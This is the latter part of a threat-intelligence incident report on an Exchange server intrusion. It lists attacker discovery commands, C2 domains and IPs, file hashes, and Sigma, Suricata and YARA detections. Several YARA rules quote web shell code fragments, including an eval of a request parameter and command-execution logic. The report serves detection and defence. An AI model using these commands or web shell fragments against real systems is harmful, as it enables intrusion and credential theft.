<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2022/03/9893-07.png"><img loading="lazy" class="aligncenter size-full wp-image-5997 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2022/03/9893-07.png" alt="" width="1682" height="302" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2022/03/9893-07.png 1682w, https://thedfirreport.com/wp-content/uploads/2022/03/9893-07-300x54.png 300w, https://thedfirreport.com/wp-content/uploads/2022/03/9893-07-1024x184.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/03/9893-07-768x138.png 768w, https://thedfirreport.com/wp-content/uploads/2022/03/9893-07-1536x276.png 1536w" data-lazy-sizes="(max-width: 1682px) 100vw, 1682px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2022/03/9893-07.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="aligncenter size-full wp-image-5997" src="https://thedfirreport.com/wp-content/uploads/2022/03/9893-07.png" alt="" width="1682" height="302" srcset="https://thedfirreport.com/wp-content/uploads/2022/03/9893-07.png 1682w, https://thedfirreport.com/wp-content/uploads/2022/03/9893-07-300x54.png 300w, https://thedfirreport.com/wp-content/uploads/2022/03/9893-07-1024x184.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/03/9893-07-768x138.png 768w, https://thedfirreport.com/wp-content/uploads/2022/03/9893-07-1536x276.png 1536w" sizes="(max-width: 1682px) 100vw, 1682px" /></noscript></a></figure>
<p>They used the PowerShell module Get-WmiObject to collect the name and IP address of the domain controller.</p>
<pre class="wp-block-preformatted">Get-WMIObject Win32_NTDomain | findstr DomainController</pre>
<p>Additionally, we saw threat actors retrieving an email address from the compromised exchange server using the below command. This was likely&nbsp;done as a test.&nbsp;</p>
<pre class="wp-block-preformatted">Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn;&nbsp;Get-Recipient | Select Name&nbsp;-ExpandProperty EmailAddresses -first 1 | Select SmtpAddress | ft&nbsp;-hidetableheaders"</pre>
<h2>Collection</h2>
<p>While having access to the Exchange server, we observed no attempts to export or access user mailboxes.</p>
<h2>Command and Control</h2>
<p>As we saw from the execution section,<code>dllhost.exe</code> was used to access the below domains for C2, which we believe was using a variation of FRP.</p>
<ul>
<li>tcp443.msupdate[.]us (107.173.231[.]114)</li>
<li>kcp53.msupdate[.]us&nbsp;</li>
<li>(107.173.231[.]114)</li>
</ul>
<p>This C2 channel was not used very much as most activity was done through the web shell.</p>
<h2>Exfiltration</h2>
<p>The only successful data that was exfiltrated from the environment was the archive containing the LSASS dump.</p>
<p>Here you can see the threat actor using the web shell command to extract it:&nbsp;</p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2022/03/9893-09.png"><img loading="lazy" class="aligncenter size-full wp-image-6000 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2022/03/9893-09.png" alt="" width="909" height="572" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2022/03/9893-09.png 909w, https://thedfirreport.com/wp-content/uploads/2022/03/9893-09-300x189.png 300w, https://thedfirreport.com/wp-content/uploads/2022/03/9893-09-768x483.png 768w" data-lazy-sizes="(max-width: 909px) 100vw, 909px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2022/03/9893-09.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="aligncenter size-full wp-image-6000" src="https://thedfirreport.com/wp-content/uploads/2022/03/9893-09.png" alt="" width="909" height="572" srcset="https://thedfirreport.com/wp-content/uploads/2022/03/9893-09.png 909w, https://thedfirreport.com/wp-content/uploads/2022/03/9893-09-300x189.png 300w, https://thedfirreport.com/wp-content/uploads/2022/03/9893-09-768x483.png 768w" sizes="(max-width: 909px) 100vw, 909px" /></noscript></a></figure>
<h2>Impact</h2>
<p>In this case, there was no further impact to the environment before the threat actors were evicted. <span style="color: #000000;">Due to our previous report and OSINT research we believe</span> with medium to high confidence that this intrusion would have ended in ransomware.</p>
<h2><strong>Indicators</strong></h2>
<p>All artifacts including web shells, files, IPs, etc. were added to our&nbsp;<a href="https://thedfirreport.com/services/" target="_blank" rel="noreferrer noopener">services</a>&nbsp;in December.</p>
<h3>Network</h3>
<pre>ipv4:148.251.71[.]182<br>ipv4:107.173.231[.]114<br>domain: tcp443.msupdate[.]us<br>domain: kcp53.msupdate[.]us<br>useragent:python-urllib3/1.26.7<br>useragent:python-requests/2.26.0</pre>
<h3>File</h3>
<pre>aspx_dyukbdcxjfi.aspx<br>1a5ad24a6880eea807078375d6461f58<br>da2470c3990ea0862a79149c6036388498da83cd<br>84f77fc4281ebf94ab4897a48aa5dd7092cc0b7c78235965637eeef0908fb6c7<br><br>dhvqx.aspx<br>b2fde6dc7bd1e04ce601f57805de415b<br>4d243969b54b9b80c1d26e0801a6e7e46d2ef03e<br>c5aae30675cc1fd83fd25330cec245af744b878a8f86626d98b8e7fcd3e970f8<br><br>dllhost.exe<br>9a3703f9c532ae2ec3025840fa449d4e<br>8ece87086e8b5aba0d1cc4ec3804bf74e0b45bee<br>1604e69d17c0f26182a3e3ff65694a49450aafd56a7e8b21697a932409dfd81e<br><br>wininet.bat<br>5f098b55f94f5a448ca28904a57c0e58<br>27102b416ef5df186bd8b35190c2a4cc4e2fbf37<br>668ec78916bab79e707dc99fdecfa10f3c87ee36d4dee6e3502d1f5663a428a0<br><br>wininet.xml<br>d2f4647a3749d30a35d5a8faff41765e<br>0f676bc786db3c44cac4d2d22070fb514b4cb64c<br>559d4abe3a6f6c93fc9eae24672a49781af140c43d491a757c8e975507b4032e<br><br>user.exe<br>f0be699c8aafc41b25a8fc0974cc4582<br>6bae2d45bbd8c4b0a59ba08892692fe86e596154<br>7b5fbbd90eab5bee6f3c25aa3c2762104e219f96501ad6a4463e25e6001eb00b<br><br>task_update.exe<br>cacb64bdf648444e66c82f5ce61caf4b<br>3a6431169073d61748829c31a9da29123dd61da8<br>12c6da07da24edba13650cd324b2ad04d0a0526bb4e853dee03c094075f</pre>
<h2>Detections</h2>
<h3>Network</h3>
<pre>ET INFO User-Agent (python-requests) Inbound to Webserver<br>ET INFO Generic HTTP EXE Upload Inbound<br>ET INFO Generic HTTP EXE Upload Outbound<br>GPL ATTACK_RESPONSE command completed<br>ET ATTACK_RESPONSE Net User Command Response<br>ET WEB_SERVER WebShell Generic - netsh firewall</pre>
<h3>Sigma</h3>
<p>Local Accounts Discovery – <a href="https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_local_system_owner_account_discovery.yml" target="_blank" rel="noreferrer noopener">https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_local_system_owner_account_discovery.yml</a></p>
<p>Lsass Memory Dump via Comsvcs DLL – <a href="https://github.com/SigmaHQ/sigma/blob/b81839e3ce507df925d6e583e569e1ac3a3894ab/rules/windows/process_access/sysmon_lsass_dump_comsvcs_dll.yml" target="_blank" rel="noreferrer noopener">https://github.com/SigmaHQ/sigma/blob/b81839e3ce507df925d6e583e569e1ac3a3894ab/rules/windows/process_access/sysmon_lsass_dump_comsvcs_dll.yml</a></p>
<p>Net.exe Execution – <a href="https://github.com/SigmaHQ/sigma/blob/777d218adc789b7f1b146701793e78799324d87d/rules/windows/process_creation/win_susp_net_execution.yml" target="_blank" rel="noreferrer noopener">https://github.com/SigmaHQ/sigma/blob/777d218adc789b7f1b146701793e78799324d87d/rules/windows/process_creation/win_susp_net_execution.yml</a></p>
<p>Net-exe User Account Creation – <a href="https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_net_user_add.yml" target="_blank" rel="noreferrer noopener">https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_net_user_add.yml</a></p>
<p>Netsh Port or Application Allowed – <a href="https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_netsh_fw_add.yml" target="_blank" rel="noreferrer noopener">https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_netsh_fw_add.yml</a></p>
<p>Netsh RDP Port Opening – <a href="https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_netsh_allow_port_rdp.yml" target="_blank" rel="noreferrer noopener">https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_netsh_allow_port_rdp.yml</a></p>
<p>Non Interactive PowerShell – <a href="https://github.com/SigmaHQ/sigma/blob/1425ede905514b7dbf3c457561aaf2ff27274724/rules/windows/process_creation/win_non_interactive_powershell.yml" target="_blank" rel="noreferrer noopener">https://github.com/SigmaHQ/sigma/blob/1425ede905514b7dbf3c457561aaf2ff27274724/rules/windows/process_creation/win_non_interactive_powershell.yml</a></p>
<p>Powershell Defender Exclusion – <a href="https://github.com/SigmaHQ/sigma/blob/682e0458a336c3a6e93b18f7e972e1d67ef01598/rules/windows/process_creation/win_powershell_defender_exclusion.yml" target="_blank" rel="noreferrer noopener">https://github.com/SigmaHQ/sigma/blob/682e0458a336c3a6e93b18f7e972e1d67ef01598/rules/windows/process_creation/win_powershell_defender_exclusion.yml</a></p>
<p>PowerShell Get-Process LSASS – <a href="https://github.com/SigmaHQ/sigma/blob/1ff5e226ad8bed34916c16ccc77ba281ca3203ae/rules/windows/process_creation/win_susp_powershell_getprocess_lsass.yml" target="_blank" rel="noreferrer noopener">https://github.com/SigmaHQ/sigma/blob/1ff5e226ad8bed34916c16ccc77ba281ca3203ae/rules/windows/process_creation/win_susp_powershell_getprocess_lsass.yml</a></p>
<p>Process Dump via Comsvcs DLL – <a href="https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_susp_comsvcs_procdump.yml" target="_blank" rel="noreferrer noopener">https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_susp_comsvcs_procdump.yml</a></p>
<p>Quick Execution of a Series of Suspicious Commands – <a href="https://github.com/SigmaHQ/sigma/blob/ed4e771700681b36eb8dd74a13dffc94c857bb46/rules/windows/process_creation/win_multiple_suspicious_cli.yml" target="_blank" rel="noreferrer noopener">https://github.com/SigmaHQ/sigma/blob/ed4e771700681b36eb8dd74a13dffc94c857bb46/rules/windows/process_creation/win_multiple_suspicious_cli.yml</a></p>
<p>Rare Scheduled Task Creations – <a href="https://github.com/SigmaHQ/sigma/blob/04f72b9e78f196544f8f1331b4d9158df34d7ecf/rules/windows/other/taskscheduler/win_rare_schtask_creation.yml" target="_blank" rel="noreferrer noopener">https://github.com/SigmaHQ/sigma/blob/04f72b9e78f196544f8f1331b4d9158df34d7ecf/rules/windows/other/taskscheduler/win_rare_schtask_creation.yml</a></p>
<p>Service Execution – <a href="https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_service_execution.yml" target="_blank" rel="noreferrer noopener">https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_service_execution.yml</a></p>
<p>Shells Spawned by Web Servers – <a href="https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_webshell_spawn.yml" target="_blank" rel="noreferrer noopener">https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_webshell_spawn.yml</a></p>
<p>Suspicious PowerShell Parent Process – <a href="https://github.com/SigmaHQ/sigma/blob/6f5271275e9ac22be9ded8b9252bce064e524153/rules/windows/process_creation/win_susp_powershell_parent_process.yml" target="_blank" rel="noreferrer noopener">https://github.com/SigmaHQ/sigma/blob/6f5271275e9ac22be9ded8b9252bce064e524153/rules/windows/process_creation/win_susp_powershell_parent_process.yml</a></p>
<p>Suspicious Script Execution From Temp Folder – <a href="https://github.com/SigmaHQ/sigma/blob/ed4e771700681b36eb8dd74a13dffc94c857bb46/rules/windows/process_creation/win_susp_script_exec_from_temp.yml" target="_blank" rel="noreferrer noopener">https://github.com/SigmaHQ/sigma/blob/ed4e771700681b36eb8dd74a13dffc94c857bb46/rules/windows/process_creation/win_susp_script_exec_from_temp.yml</a></p>
<p>Wdigest Enable UseLogonCredential – <a href="https://github.com/SigmaHQ/sigma/blob/503df469687fe4d14d2119a95723485d079ec0d9/rules/windows/registry_event/sysmon_wdigest_enable_uselogoncredential.yml" target="_blank" rel="noreferrer noopener">https://github.com/SigmaHQ/sigma/blob/503df469687fe4d14d2119a95723485d079ec0d9/rules/windows/registry_event/sysmon_wdigest_enable_uselogoncredential.yml</a></p>
<p>Webshell Detection With Command Line Keywords – <a href="https://github.com/SigmaHQ/sigma/blob/1cfca93354d25e458db40f8d48403602b46bbf03/rules/windows/process_creation/win_webshell_detection.yml" target="_blank" rel="noreferrer noopener">https://github.com/SigmaHQ/sigma/blob/1cfca93354d25e458db40f8d48403602b46bbf03/rules/windows/process_creation/win_webshell_detection.yml</a></p>
<p>Windows Defender Real-Time Protection Disabled – <a href="https://github.com/SigmaHQ/sigma/blob/57cdfd261266b81255e330723f4adf270fc4c4f8/rules/windows/registry_event/registry_event_defender_realtime_protection_disabled.yml" target="_blank" rel="noreferrer noopener">https://github.com/SigmaHQ/sigma/blob/57cdfd261266b81255e330723f4adf270fc4c4f8/rules/windows/registry_event/registry_event_defender_realtime_protection_disabled.yml</a></p>
<p>Windows Defender Threat Detection Disabled – <a href="https://github.com/SigmaHQ/sigma/blob/57cdfd261266b81255e330723f4adf270fc4c4f8/rules/windows/registry_event/registry_event_defender_disabled.yml" target="_blank" rel="noreferrer noopener">https://github.com/SigmaHQ/sigma/blob/57cdfd261266b81255e330723f4adf270fc4c4f8/rules/windows/registry_event/registry_event_defender_disabled.yml</a></p>
<p>Windows Shell Spawning Suspicious Program – <a href="https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_shell_spawn_susp_program.yml" target="_blank" rel="noreferrer noopener">https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_shell_spawn_susp_program.yml</a></p>
<p>Windows Suspicious Use Of Web Request in CommandLine – <a href="https://github.com/SigmaHQ/sigma/blob/98d7380a40d503ffd225420f7318b79d9f5097b8/rules/windows/process_creation/process_creation_susp_web_request_cmd.yml" target="_blank" rel="noreferrer noopener">https://github.com/SigmaHQ/sigma/blob/98d7380a40d503ffd225420f7318b79d9f5097b8/rules/windows/process_creation/process_creation_susp_web_request_cmd.yml</a></p>
<p>Windows Webshell Creation – <a href="https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/file_event/sysmon_webshell_creation_detect.yml" target="_blank" rel="noreferrer noopener">https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/file_event/sysmon_webshell_creation_detect.yml</a></p>
<h3>Yara</h3>
<pre>rule files_dhvqx {
   meta:
      description = "9893_files - file dhvqx.aspx"
      author = "TheDFIRReport"
      eference = "Case: 9893"
      date = "2022-02-27"
      hash1 = "c5aae30675cc1fd83fd25330cec245af744b878a8f86626d98b8e7fcd3e970f8"
   strings:
      $s1 = "eval(Request['exec_code'],'unsafe');Response.End;" fullword ascii
      $s2 = "6&lt;script language='JScript' runat='server'&gt;" fullword ascii
      $s3 = "AEALAAAAAAAAAAA" fullword ascii
      $s4 = "AFAVAJA" fullword ascii
      $s5 = "AAAAAAV" fullword ascii
      $s6 = "LAAAAAAA" fullword ascii
      $s7 = "ANAZAQA" fullword ascii
      $s8 = "ALAAAAA" fullword ascii
      $s9 = "AAAAAEA" ascii
      $s10 = "ALAHAUA" fullword ascii
   condition:
      uint16(0) == 0x4221 and filesize &lt; 800KB and
      ($s1 and $s2)  and 4 of them
}


rule aspx_dyukbdcxjfi {
   meta:
      description = "9893_files - file aspx_dyukbdcxjfi.aspx"
      author = "TheDFIRReport"
      eference = "Case: 9893"
      date = "2022-02-27"
      hash1 = "84f77fc4281ebf94ab4897a48aa5dd7092cc0b7c78235965637eeef0908fb6c7"
   strings:
      $s1 = "string[] commands = exec_code.Substring(\"run \".Length).Split(new[] { ';' }, StringSplitOptions.RemoveEmpty" ascii
      $s2 = "string[] commands = exec_code.Substring(\"run \".Length).Split(new[] { ';' }, StringSplitOptions.RemoveEmpty" ascii
      $s3 = "var dstFile = Path.Combine(dstDir, Path.GetFileName(httpPostedFile.FileName));" fullword ascii
      $s4 = "info.UseShellExecute = false;" fullword ascii
      $s5 = "using (StreamReader streamReader = process.StandardError)" fullword ascii
      $s6 = "return httpPostedFile.FileName + \" Uploaded to: \" + dstFile;" fullword ascii
      $s7 = "else if (exec_code.StartsWith(\"download \"))" fullword ascii
      $s8 = "string[] parts = exec_code.Substring(\"download \".Length).Split(' ');" fullword ascii
      $s9 = "Response.AppendHeader(\"Content-Disposition\", \"attachment; filename=\" + fileName);" fullword ascii
      $s10 = "result = result + Environment.NewLine + \"ERROR:\" + Environment.NewLine + error;" fullword ascii
      $s11 = "else if (exec_code == \"get\")" fullword ascii
      $s12 = "int fileLength = httpPostedFile.ContentLength;" fullword ascii
   condition:
      uint16(0) == 0x4221 and filesize &lt; 800KB and
      8 of them
}


rule files_user {
   meta:
      description = "9893_files - file user.exe"
      author = "TheDFIRReport"
      eference = "Case: 9893"
      date = "2022-02-27"
      hash1 = "7b5fbbd90eab5bee6f3c25aa3c2762104e219f96501ad6a4463e25e6001eb00b"
   strings:
      $x1 = "PA&lt;?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?&gt; &lt;assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVer" ascii
      $s2 = "\", or \"requireAdministrator\" --&gt; &lt;v3:requestedExecutionLevel level=\"requireAdministrator\" /&gt; &lt;/v3:requestedPrivileges&gt; &lt;/v3" ascii
      $s3 = "-InitOnceExecuteOnce" fullword ascii
      $s4 = "0\"&gt; &lt;dependency&gt; &lt;dependentAssembly&gt; &lt;assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0." ascii
      $s5 = "s:v3=\"urn:schemas-microsoft-com:asm.v3\"&gt; &lt;v3:security&gt; &lt;v3:requestedPrivileges&gt; &lt;!-- level can be \"asInvoker\", \"highestAvai" ascii
      $s6 = "PB_GadgetStack_%I64i" fullword ascii
      $s7 = "PB_DropAccept" fullword ascii
      $s8 = "rocessorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /&gt; &lt;/dependentAssembly&gt; &lt;/dependency&gt; &lt;v3:trustInf" ascii
      $s9 = "PB_PostEventMessage" fullword ascii
      $s10 = "PB_WindowID" fullword ascii
      $s11 = "?GetLongPathNameA" fullword ascii
      $s12 = "Memory page error" fullword ascii
      $s13 = "PPPPPPH" fullword ascii
      $s14 = "YZAXAYH" fullword ascii
      $s15 = "%d:%I64d:%I64d:%I64d" fullword ascii
      $s16 = "NGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDI" ascii
      $s17 = "PYZAXAYH" fullword ascii
      $s18 = "PB_MDI_Gadget" fullword ascii
      $s19 = "PA&lt;?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?&gt; &lt;assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVer" ascii
      $s20 = " 46B722FD25E69870FA7711924BC5304D 787242D55F2C49A23F5D97710D972108 A2DB26CE3BBE7B2CB12F9BEFB37891A3" fullword wide
   condition:
      uint16(0) == 0x5a4d and filesize &lt; 300KB and
      1 of ($x*) and 4 of them
}


rule task_update {
   meta:
      description = "9893_files - file task_update.exe"
      author = "TheDFIRReport"
      eference = "Case: 9893"
      date = "2022-02-27"
      hash1 = "12c6da07da24edba13650cd324b2ad04d0a0526bb4e853dee03c094075ff6d1a"
   strings:
      $x1 = "&lt;?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?&gt; &lt;assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersi" ascii
      $s2 = " or \"requireAdministrator\" --&gt; &lt;v3:requestedExecutionLevel level=\"requireAdministrator\" /&gt; &lt;/v3:requestedPrivileges&gt; &lt;/v3:se" ascii
      $s3 = "-InitOnceExecuteOnce" fullword ascii
      $s4 = "&gt; &lt;dependency&gt; &lt;dependentAssembly&gt; &lt;assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0" ascii
      $s5 = "v3=\"urn:schemas-microsoft-com:asm.v3\"&gt; &lt;v3:security&gt; &lt;v3:requestedPrivileges&gt; &lt;!-- level can be \"asInvoker\", \"highestAvaila" ascii
      $s6 = "PB_GadgetStack_%I64i" fullword ascii
      $s7 = "PB_DropAccept" fullword ascii
      $s8 = "PB_PostEventMessage" fullword ascii
      $s9 = "PB_WindowID" fullword ascii
      $s10 = "?GetLongPathNameA" fullword ascii
      $s11 = "cessorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /&gt; &lt;/dependentAssembly&gt; &lt;/dependency&gt; &lt;v3:trustInfo " ascii
      $s12 = "Memory page error" fullword ascii
      $s13 = "PPPPPPH" fullword ascii
      $s14 = "YZAXAYH" fullword ascii
      $s15 = "%d:%I64d:%I64d:%I64d" fullword ascii
      $s16 = "PYZAXAYH" fullword ascii
      $s17 = "PB_MDI_Gadget" fullword ascii
      $s18 = "&lt;?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?&gt; &lt;assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersi" ascii
      $s19 = " 11FCC18FB2B55FC3C988F6A76FCF8A2D 56D49E57AD1A051BF62C458CD6F3DEA9 6104990DFEA3DFAB044FAF960458DB09" fullword wide
      $s20 = "PostEventClass" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize &lt; 300KB and
      1 of ($x*) and 4 of them
}


rule App_Web_vjloy3pa {
   meta:
      description = "9893_files - file App_Web_vjloy3pa.dll"
      author = "TheDFIRReport"
      eference = "Case: 9893"
      date = "2022-02-27"
      hash1 = "faa315db522d8ce597ac0aa957bf5bde31d91de94e68d5aefac4e3e2c11aa970"
   strings:
      $x2 = "hSystem.ComponentModel.DataAnnotations, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" fullword ascii
      $s3 = "MSystem.Xml, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii
      $s4 = "RSystem.Xml.Linq, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii
      $s5 = "ZSystem.ServiceModel.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" fullword ascii
      $s6 = "YSystem.Web.DynamicData, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" fullword ascii
      $s7 = "XSystem.Web.Extensions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" fullword ascii
      $s8 = "VSystem.Web.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" fullword ascii
      $s9 = "MSystem.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" fullword ascii
      $s10 = "WSystem.Configuration, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" fullword ascii
      $s11 = "`System.Data.DataSetExtensions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii
      $s12 = "NSystem.Core, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii
      $s13 = "ZSystem.WorkflowServices, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" fullword ascii
      $s14 = "WSystem.IdentityModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii
      $s15 = "aSystem.ServiceModel.Activation, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" fullword ascii
      $s16 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" wide /* base64 encoded string '' */
      $s17 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" wide /* base64 encoded string '' */
      $s18 = "aSystem.Web.ApplicationServices, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" fullword ascii
      $s19 = "\\System.EnterpriseServices, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" fullword ascii
      $s20 = "SMicrosoft.CSharp, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize &lt; 2000KB and
      1 of ($x*) and 4 of them
}




rule _user_task_update_0 {
   meta:
      description = "9893_files - from files user.exe, task_update.exe"
      author = "TheDFIRReport"
      eference = "Case: 9893"
      date = "2022-02-27"
      hash1 = "7b5fbbd90eab5bee6f3c25aa3c2762104e219f96501ad6a4463e25e6001eb00b"
      hash2 = "12c6da07da24edba13650cd324b2ad04d0a0526bb4e853dee03c094075ff6d1a"
   strings:
      $s1 = "-InitOnceExecuteOnce" fullword ascii
      $s2 = "PB_GadgetStack_%I64i" fullword ascii
      $s3 = "PB_DropAccept" fullword ascii
      $s4 = "PB_PostEventMessage" fullword ascii
      $s5 = "PB_WindowID" fullword ascii
      $s6 = "?GetLongPathNameA" fullword ascii
      $s7 = "Memory page error" fullword ascii
      $s8 = "PPPPPPH" fullword ascii
      $s9 = "YZAXAYH" fullword ascii
      $s10 = "%d:%I64d:%I64d:%I64d" fullword ascii
      $s11 = "PYZAXAYH" fullword ascii
      $s12 = "PB_MDI_Gadget" fullword ascii
      $s13 = "PostEventClass" fullword ascii
      $s14 = "t$hYZAXAYH" fullword ascii
      $s15 = "$YZAXAYH" fullword ascii
      $s16 = "Floating-point underflow (exponent too small)" fullword ascii
      $s17 = "Inexact floating-point result" fullword ascii
      $s18 = "Single step trap" fullword ascii
      $s19 = "Division by zero (floating-point)" fullword ascii
      $s20 = "tmHcI(H" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize &lt; 300KB and ( 8 of them )
      ) or ( all of them )<br>}</pre>
<h3>MITRE</h3>
<ul>
<li>Exploit Public-Facing Application – T1190</li>
<li>OS Credential Dumping – T1003</li>
<li>Account Manipulation – T1098</li>
<li>Valid Accounts – T1078</li>
<li>Ingress Tool Transfer – T1105</li>
<li>Match Legitimate Name or Location – T1036.005</li>
<li>Windows Service – T1543.003</li>
<li>Web Shell – T1505.003</li>
<li>System Information Discovery – T1082</li>
<li>System Network Configuration Discovery – T1016</li>
<li>System Owner/User Discovery – T1033</li>
<li>Windows Command Shell – T1059.003</li>
</ul>
<p>Internal case #9893</p>
<div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul data-sharing-events-added="true"><li class="share-twitter"><a rel="nofollow noopener noreferrer" data-shared="sharing-twitter-5981" class="share-twitter sd-button share-icon" href="https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell/?share=twitter&amp;nb=1" target="_blank" title="Click to share on Twitter"><span>Twitter</span></a></li><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-5981" class="share-facebook sd-button share-icon" href="https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell/?share=facebook&amp;nb=1" target="_blank" title="Click to share on Facebook"><span>Facebook</span></a></li><li class="share-linkedin"><a rel="nofollow noopener noreferrer" data-shared="sharing-linkedin-5981" class="share-linkedin sd-button share-icon" href="https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell/?share=linkedin&amp;nb=1" target="_blank" title="Click to share on LinkedIn"><span>LinkedIn</span></a></li><li class="share-reddit"><a rel="nofollow noopener noreferrer" data-shared="" class="share-reddit sd-button share-icon" href="https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell/?share=reddit&amp;nb=1" target="_blank" title="Click to share on Reddit"><span>Reddit</span></a></li><li class="share-end"></li></ul></div></div></div>
<div id="jp-relatedposts" class="jp-relatedposts" style="display: block;">
<h3 class="jp-relatedposts-headline"><em>Related</em></h3>
